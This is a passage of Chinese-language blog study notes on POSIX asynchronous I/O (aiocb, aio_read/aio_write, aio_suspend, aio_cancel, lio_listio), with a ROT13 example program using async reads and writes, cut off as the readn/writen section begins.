class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">aiocb</span>&#123;</span><br>    <span class="hljs-type">int</span> aio_fildes; <span class="hljs-comment">//文件描述符</span><br>    <span class="hljs-type">off_t</span> aio_offset; <span class="hljs-comment">//基于I/O的文件偏移</span><br>    <span class="hljs-keyword">volatile</span> <span class="hljs-type">void</span> *aio_buf; <span class="hljs-comment">//I/O buffer</span><br>    <span class="hljs-type">size_t</span> aio_nbytes; <span class="hljs-comment">//需要转换为字节数</span><br>    <span class="hljs-type">int</span> aio_reqprio <span class="hljs-comment">//优先级</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sigevent</span> <span class="hljs-title">aio_sigevent</span>;</span> <span class="hljs-comment">//信号的信息   </span><br>    <span class="hljs-type">int</span> aio_lio_opcode; <span class="hljs-comment">//操作列表I/O</span><br>&#125;;<br><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sigevent</span>&#123;</span><br>  <span class="hljs-type">int</span> sigev_notify; <span class="hljs-comment">//通知类型</span><br>  <span class="hljs-type">int</span> sigev_signo; <span class="hljs-comment">//信号数字</span><br>  <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">sigval</span> <span class="hljs-title">sigev_value</span>;</span> <span class="hljs-comment">//通知参数</span><br>  <span class="hljs-type">void</span> (*sigev_notify_function)(<span class="hljs-keyword">union</span> sigval); <span class="hljs-comment">//通知函数</span><br>  <span class="hljs-type">pthread_attr_t</span> *sigev_notify_attributes; <span class="hljs-comment">//通知属性</span><br>&#125;;<br></code></pre></td></tr></table></figure><p><code>sigev_notify</code>类型有三个值可选</p><ul><li><code>SIGEV_NONE</code>：异步<code>I/O</code>请求完成时不会通知进程</li><li><code>SIGEV_SIGNAL</code>：当异步<code>I/O</code>请求完成时，将生成<code>sigev_signo</code>字段指定的信号</li><li><code>SIGEV_THREAD</code>：当异步<code>I/O</code>请求完成时，调用<code>sigev_notify_function</code>字段指定的函数。传递<code>sigev_value</code>字段作为其唯一参数。除非<code>sigev_notify_attributes</code>字段设置为<code>pthread</code>属性结构的地址，否则该函数将在分离状态的单独线程中执行</li></ul><p>在执行异步<code>I/O</code>前，需要初始化<code>AIO</code>控制块，并调用<code>AIO_read</code>函数进行异步读取，或者调用<code>AIO_write</code>函数进行非同步写入</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;aio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">aio_read</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> aiocb *aiocb)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">aio_write</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> aiocb *aiocb)</span>;<br><br>Both <span class="hljs-keyword">return</span>:<span class="hljs-number">0</span> <span class="hljs-keyword">if</span> OK, <span class="hljs-number">-1</span> on error<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;aio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">aio_fsync</span><span class="hljs-params">(<span class="hljs-type">int</span> op, <span class="hljs-keyword">struct</span> aiocb *aiocb)</span>;<br><br>Returns:<span class="hljs-number">0</span> <span class="hljs-keyword">if</span> OK, <span class="hljs-number">-1</span> on error<br></code></pre></td></tr></table></figure><ul><li><code>op</code>设置为<code>O_DSYNC</code>类似于<code>fdatasync</code>的调用</li><li><code>op</code>设置为<code>O_SYNC</code>类似于<code>fsync</code>的调用，需要你在入参的位置上传递给他一个<code>fd</code>，然后系统调用就会对这个<code>fd</code>指向的文件起作用。<code>fsync</code>会确保一直到写磁盘操作结束才会返回。</li></ul><p>为了确定异步读、写或同步操作的完成状态，则通过<code>aio_error</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;aio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">aio_error</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> aiocb *aiocb)</span>;<br><br>Returns:(see following)<br></code></pre></td></tr></table></figure><p><strong>返回值</strong></p><ul><li>0，异步操作已完成，需要通过<code>aio_return</code>函数从操作中获取返回值</li><li>-1，异步操作失败，<code>errno</code>中存储了原因</li><li><code>EINPROGRESS</code>，异步读取、写入或同步仍处于挂起状态</li><li>其他值，任何其他返回值都会为我们提供与失败的异步操作相对应的错误代码。</li></ul><p>通过<code>aio_return</code>获取操作的返回值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;atio.h&gt;</span></span><br><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">aio_return</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> aiocb *aiocb)</span>;<br><br>Returns:(see following)<br></code></pre></td></tr></table></figure><ul><li>-1，设置<code>errno</code>则返回错误</li><li>返回异步操作的结果</li></ul><p>当完成其他处理但仍然有其他异步操作未完成时，调用<code>aio_suspend</code>函数进行阻塞</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;aio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">aio_suspend</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> aiocb *<span class="hljs-type">const</span> <span class="hljs-built_in">list</span>[], <span class="hljs-type">int</span> nent,</span><br><span class="hljs-params">               <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> timespec *timeout)</span>;<br>Returns:<span class="hljs-number">0</span> <span class="hljs-keyword">if</span> OK, <span class="hljs-number">-1</span> on error<br></code></pre></td></tr></table></figure><ul><li>当被信号中断时，返回-1且将<code>errno</code>设置为<code>EINTR</code></li><li>超时，返回-1且将<code>errno</code>设置为<code>EAGAIN</code></li><li>如果异步操作完成，则返回0</li><li>如果在调用<code>aio_suspend</code>时所有异步<code>I/O</code>操作都已完成，那么<code>aio_susend</code>将返回而不会阻塞</li></ul><p>取消异步操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;aio.h&gt;</span></span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">fd指定想要取消的未完成异步操作的I/O，若aiocb为NULL则取消所有异步操作</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">aio_cancel</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-keyword">struct</span> aiocb *aiocb)</span>;<br>Returns:(see following)<br></code></pre></td></tr></table></figure><ul><li><p><code>AIO_ALLDONE</code>：所有操作在取消前已经全部完成</p></li><li><p><code>AIO_CANCELED</code>：所有请求的操作都已经被取消</p></li><li><p><code>AIO_NOTCANCELED</code>：至少有一个请求未被取消</p></li><li><p>-1：调用<code>aio_cancel</code>函数失败，错误代码被存在<code>errno</code></p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;aio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">lio_listio</span><span class="hljs-params">(<span class="hljs-type">int</span> mode,  <span class="hljs-comment">//判断I/O是否为真正异步</span></span><br><span class="hljs-params">               <span class="hljs-keyword">struct</span> aiocb *<span class="hljs-keyword">restrict</span> <span class="hljs-type">const</span> <span class="hljs-built_in">list</span>[<span class="hljs-keyword">restrict</span>],<span class="hljs-comment">//需要执行的I/O操作的AIO控制块列表</span></span><br><span class="hljs-params">              <span class="hljs-type">int</span> nent, <span class="hljs-comment">//元素的个数</span></span><br><span class="hljs-params">              <span class="hljs-keyword">struct</span> sigevent *<span class="hljs-keyword">restrict</span> sigev <span class="hljs-comment">//通知的补充，当所有I/O操作完成时发送</span></span><br><span class="hljs-params">              )</span>;<br>Returns:<span class="hljs-number">0</span> <span class="hljs-keyword">if</span> OK, <span class="hljs-number">-1</span> on error<br></code></pre></td></tr></table></figure><p>此函数可以控制一个<code>AIO</code>控制块列表来描述<code>IO</code>请求</p><p><strong>mode</strong></p><ul><li><code>LIO_WAIT</code>：直到<code>list</code>指定的所有操作完成时才会返回，<code>sigev</code>参数将会被忽略</li><li><code>LIO_NOWAIT</code>：当<code>I/O</code>请求排队时，<code>lio_listio</code>函数立即返回。根据<code>sigev</code>参数的指定，当所有<code>I/O</code>操作完成时，将异步通知进程。不想通知时，<code>sigev</code>可以被设置为<code>NULL</code></li></ul><p><code>AIO</code>控制块中的<code>aio_lio_opcoded</code>区域制定了操作是否为读、写或者忽略。读被认为是传入<code>aio_read</code>函数，写被认为是传入<code>aio_write</code>函数</p><p>以下是限制允许执行的异步<code>I/O</code>操作的数量</p><p><img src="https://gitee.com/h0pe-ay/blogimages/raw/master/image-20230203221759223.png" alt="image-20230203221759223"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ctype.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;aio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BSZ 4096</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NBUF 8</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>FILE_MODE(S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH)</span><br><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">rwop</span> &#123;</span><br>    UNUSERD = <span class="hljs-number">0</span>,<br>    READ_PENDING = <span class="hljs-number">1</span>,<br>    WRITE_PENDING = <span class="hljs-number">2</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">buf</span>&#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">rwop</span> <span class="hljs-title">op</span>;</span> <span class="hljs-comment">//操作码</span><br>    <span class="hljs-type">int</span> last;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">aiocb</span> <span class="hljs-title">aiocb</span>;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> data[BSZ];<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">buf</span> <span class="hljs-title">bufs</span>[<span class="hljs-title">NBUF</span>];</span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span><br><span class="hljs-title function_">translate</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> c)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">isalpha</span>(c))&#123;<br>        <span class="hljs-keyword">if</span> (c &gt;= <span class="hljs-string">&#x27;n&#x27;</span>)<br>            c -= <span class="hljs-number">13</span>;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (c &gt;= <span class="hljs-string">&#x27;a&#x27;</span>)<br>            c += <span class="hljs-number">13</span>;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (c &gt;= <span class="hljs-string">&#x27;N&#x27;</span>)<br>            c -= <span class="hljs-number">13</span>;<br>        <span class="hljs-keyword">else</span> <br>            c += <span class="hljs-number">13</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span>(c);<br>&#125;<br><br><span class="hljs-type">int</span><br><span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>* argv[])</span><br>&#123;<br>    <span class="hljs-type">int</span> ifd, ofd, i, j, n, err, numop;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">sbuf</span>;</span><br>    <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">aiocb</span> *<span class="hljs-title">aiolist</span>[<span class="hljs-title">NBUF</span>];</span><br>    <span class="hljs-type">off_t</span> off = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">3</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;usage: rot13 infile outfile&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> ((ifd = open(argv[<span class="hljs-number">1</span>], O_RDONLY)) &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;can&#x27;t open %s&quot;</span>, argv[<span class="hljs-number">1</span>]); <br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> ((ofd = open(argv[<span class="hljs-number">2</span>], O_RDWR | O_CREAT | O_TRUNC, FILE_MODE)) &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;can&#x27;t create %s&quot;</span>, argv[<span class="hljs-number">2</span>]);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (fstat(ifd, &amp;sbuf) &lt; <span class="hljs-number">0</span>) <span class="hljs-comment">//获取读入文件的状态</span><br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<span class="hljs-string">&quot;fstat failed&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>;i &lt; NBUF; i++)&#123; <span class="hljs-comment">//初始化</span><br>        bufs[i].op = UNUSERD;<br>        bufs[i].aiocb.aio_buf = bufs[i].data;<br>        bufs[i].aiocb.aio_sigevent.sigev_notify = SIGEV_NONE; <span class="hljs-comment">//异步`I/O`请求完成时不会通知进程</span><br>        aiolist[i] = <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>    numop = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (;;)&#123;<br>        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; NBUF; i++)&#123;<br>            <span class="hljs-keyword">switch</span> (bufs[i].op)<br>            &#123;<br>                <br>            <span class="hljs-keyword">case</span> UNUSERD: <span class="hljs-comment">//初始状态</span><br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;UNUSERD\n&quot;</span>);<br>                <br>                <span class="hljs-keyword">if</span> (off &lt; sbuf.st_size) <span class="hljs-comment">//偏移小于文件大小</span><br>                &#123;<br>                    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,sbuf.st_size);<br>                    bufs[i].op = READ_PENDING; <span class="hljs-comment">//挂起</span><br>                    bufs[i].aiocb.aio_fildes = ifd;<br>                    bufs[i].aiocb.aio_offset = off;<br>                    off += BSZ; <span class="hljs-comment">//每次读取BSZ大小</span><br>                    <span class="hljs-keyword">if</span> (off &gt;= sbuf.st_size)<br>                        bufs[i].last = <span class="hljs-number">1</span>; <span class="hljs-comment">//到达文件末尾</span><br>                    bufs[i].aiocb.aio_nbytes = BSZ;<br>                    <span class="hljs-keyword">if</span> (aio_read(&amp;bufs[i].aiocb) &lt; <span class="hljs-number">0</span>) <span class="hljs-comment">//异步读</span><br>                    &#123;<br>                        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;aio_read failed&quot;</span>);<br>                        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>                    &#125;<br>                    aiolist[i] = &amp;bufs[i].aiocb;<br>                    numop++;<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> READ_PENDING:<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;READ\n&quot;</span>);<br>                <span class="hljs-keyword">if</span> ((err = aio_error(&amp;bufs[i].aiocb)) == EINPROGRESS) <span class="hljs-comment">//异步读取、写入或同步仍处于挂起状态</span><br>                    <span class="hljs-keyword">continue</span>;<br>                <span class="hljs-keyword">if</span> (err != <span class="hljs-number">0</span>)&#123;<br>                    <span class="hljs-keyword">if</span> (err == <span class="hljs-number">-1</span>)<br>                    &#123;<br>                        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;aio_error failed&quot;</span>);<br>                        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>                    &#125;<br>                    <span class="hljs-keyword">else</span><br>                    &#123;<br>                        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<span class="hljs-string">&quot;read failed&quot;</span>);<br>                        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>                    &#125;<br>                &#125;<br>                <span class="hljs-keyword">if</span> ((n = aio_return(&amp;bufs[i].aiocb)) &lt; <span class="hljs-number">0</span>)<br>                &#123;<br>                    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;aio_return failed&quot;</span>);<br>                    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>                &#125;<br>                <span class="hljs-keyword">if</span> ( n != BSZ &amp;&amp; !bufs[i].last) <span class="hljs-comment">//若读取的长度不是BSZ则没读全</span><br>                &#123;<br>                    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;short read (%d/%d)&quot;</span>,n, BSZ);<br>                    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>                &#125;<br>                <span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; n; j++)<br>                    bufs[i].data[j] = translate(bufs[i].data[j]);<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>,bufs[i].data);<br>                bufs[i].op = WRITE_PENDING;<br>                bufs[i].aiocb.aio_fildes = ofd;<br>                bufs[i].aiocb.aio_nbytes = n;<br>                <span class="hljs-keyword">if</span> (aio_write(&amp;bufs[i].aiocb) &lt; <span class="hljs-number">0</span>) <span class="hljs-comment">//异步写</span><br>                &#123;<br>                    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<span class="hljs-string">&quot;aio_write failed&quot;</span>);<br>                    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> WRITE_PENDING:<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;WRITE\n&quot;</span>);<br>                <span class="hljs-keyword">if</span> ((err = aio_error(&amp;bufs[i].aiocb)) == EINPROGRESS)<br>                    <span class="hljs-keyword">continue</span>;<br>                <span class="hljs-keyword">if</span> (err != <span class="hljs-number">0</span>)&#123;<br>                    <span class="hljs-keyword">if</span> (err == <span class="hljs-number">-1</span>)<br>                    &#123;<br>                        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<span class="hljs-string">&quot;aio_error faiiled&quot;</span>);<br>                        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>                    &#125;<br>                    <span class="hljs-keyword">else</span><br>                    &#123;<br>                        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<span class="hljs-string">&quot;write failed&quot;</span>);<br>                        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>                    &#125;<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> ((n = aio_return(&amp;bufs[i].aiocb)) &lt; <span class="hljs-number">0</span>)<br>                &#123;<br>                    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<span class="hljs-string">&quot;aio_return failed&quot;</span>);<br>                    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>                &#125;<br>                <span class="hljs-keyword">if</span> (n != bufs[i].aiocb.aio_nbytes)<br>                &#123;<br>                    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<span class="hljs-string">&quot;short write (%d/%d)&quot;</span>,n , BSZ);<br>                    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>                &#125;<br>                aiolist[i] = <span class="hljs-literal">NULL</span>;<br>                bufs[i].op = UNUSERD;<br>                numop--;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (numop == <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">if</span> (off &gt;= sbuf.st_size)<br>                <span class="hljs-keyword">break</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">if</span> (aio_suspend(aiolist, NBUF, <span class="hljs-literal">NULL</span>) &lt; <span class="hljs-number">0</span>)<br>            &#123;<br>                <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;aio_suspend failed&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>    bufs[<span class="hljs-number">0</span>].aiocb.aio_fildes = ofd;<br>    <span class="hljs-keyword">if</span> (aio_fsync(O_SYNC, &amp;bufs[<span class="hljs-number">0</span>].aiocb) &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;aio_fsync failed&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="readn和writen"><a href="#readn和writen" class="headerlink" title="readn和writen"></a>readn和writen</h3><p>管道、FIFOs和一些设备，特别是终端和网络，会有两个特点</p><ul><li>读取的数据会比要求的少，这不是错误，而需要继续读</li><li>写的数据比预期的少，造成这样的原因是写缓冲区已经满了，需要继续写剩余的数据。导致这样的原因通常是不阻塞的文件描述符以及捕获了信号。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;apue.h&quot;</span></span><br><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">readn</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">void</span> *buf <span 